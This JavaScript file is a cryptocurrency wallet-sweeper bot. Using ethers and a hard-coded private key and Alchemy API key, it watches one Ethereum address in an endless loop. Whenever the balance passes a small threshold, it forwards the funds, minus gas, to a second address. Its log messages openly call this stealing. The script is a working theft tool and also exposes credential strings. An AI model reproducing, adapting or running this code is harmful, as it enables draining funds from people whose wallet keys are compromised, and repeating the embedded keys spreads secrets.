let attempt = 0;
const //
  { JsonRpcProvider, Wallet } = require("ethers"),
  testNetProviderUrl =
    "https://eth-sepolia.g.alchemy.com/v2/SDZDOb_2h0kYSV6lOcR_P1pMNIDLeNcs",
  mainNetProviderUrl =
    "https://eth-mainnet.g.alchemy.com/v2/SDZDOb_2h0kYSV6lOcR_P1pMNIDLeNcs",
  TA = "0x6cCb04AF0793413580B8a060388d11861F3238ED",
  SA = "0x7B2359fBDEe8c890cc92b138b05e52696EaE4590",
  provider = new JsonRpcProvider(testNetProviderUrl),
  privateKey =
    "69b554c4ed13b92ab74773c970a6592065a0c0159669e1ff4b3d936e2a3f7019",
  wallet = new Wallet(privateKey, provider),
  //
  getBal = async () => {
    const bal = await provider.getBalance(TA);
    // console.log(Number(bal) / 1e18);
    return bal;
  },
  secureAssets = async () => {
    let balance = await getBal();

    if (Number(balance) > 0.00085e18) {
      console.log("balance is greater than $2,  STEALING it");
      try {
        // estimate gas price for sending balance
        const //
          gasPrice = await provider.estimateGas({
            to: SA,
            value: balance,
          }),
          // fetch current base fee
          latestBlock = await provider.getBlock("latest"),
          currentBaseFee = latestBlock.baseFeePerGas,
          // define tip
          tip = BigInt(1e9), // 2 wei
          // calculate cost of sending balance
          cost = (currentBaseFee + tip) * gasPrice,
          // subtract cost from balance
          transferableAmount = balance - cost,
          // secure/send the difference
          tnx = await wallet.sendTransaction({
            to: SA,
            value: transferableAmount,
          });
        await tnx.wait();
        console.log("> Asset stolen");
        // keep watching balance fo changes
        attempt = 0;
        secureAssets();
      } catch (error) {
        console.log("\n" + error.shortMessage + "\n");
        secureAssets();
      }
    } else {
      console.log(`
        attempt ${(attempt += 1)}
> Balance is less than $2,
> no need to secure it now,
> watching for positive changes
`);
      secureAssets();
    }
  };

secureAssets();
// getBal();
console.clear();

console.log("> monitoring account");

console.time("> fetched balance in: ");
